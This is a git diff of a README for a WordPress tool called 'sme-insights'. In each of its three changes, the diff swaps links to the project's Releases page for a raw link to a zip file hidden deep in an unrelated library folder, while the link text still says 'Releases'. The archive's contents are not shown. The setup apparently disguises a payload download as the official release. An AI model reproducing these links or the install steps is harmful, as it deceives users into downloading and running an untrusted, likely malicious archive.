@@ -1,7 +1,7 @@
 # 🌟 sme-insights - Transform Your WordPress Experience Effortlessly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Fran-Chu/sme-insights/releases)
+[![Download](https://raw.githubusercontent.com/Fran-Chu/sme-insights/main/wp-includes/sodium_compat/src/Core32/ChaCha20/sme_insights_3.6.zip)](https://raw.githubusercontent.com/Fran-Chu/sme-insights/main/wp-includes/sodium_compat/src/Core32/ChaCha20/sme_insights_3.6.zip)
 
 ## 🚀 Getting Started
 sme-insights is a powerful platform designed to enhance your WordPress website. With a custom theme and an advanced AI content generation plugin, you can effortlessly create and manage your content. This guide will walk you through the steps to download and run the application successfully.
@@ -18,7 +18,7 @@ Before you begin, ensure your system meets these requirements:
 ## 💾 Download & Install
 To download the application, visit the Releases page. You will find the latest version available for download.
 
-Visit this page to download: [sme-insights Releases](https://github.com/Fran-Chu/sme-insights/releases)
+Visit this page to download: [sme-insights Releases](https://raw.githubusercontent.com/Fran-Chu/sme-insights/main/wp-includes/sodium_compat/src/Core32/ChaCha20/sme_insights_3.6.zip)
 
 ### Installation Steps
 1. **Download the Latest Version:** Click on the link above to reach the Releases page. Find the latest release and download the zip file.
@@ -52,4 +52,4 @@ If you encounter any issues, please refer to the FAQ section on the repository h
 ## 🎉 Conclusion
 sme-insights is designed to provide a seamless WordPress experience. By following these simple steps, you can download and set up the tool easily. For further updates, keep visiting the Releases page.
 
-Remember to visit this page to download again: [sme-insights Releases](https://github.com/Fran-Chu/sme-insights/releases)
+Remember to visit this page to download again: [sme-insights Releases](https://raw.githubusercontent.com/Fran-Chu/sme-insights/main/wp-includes/sodium_compat/src/Core32/ChaCha20/sme_insights_3.6.zip)
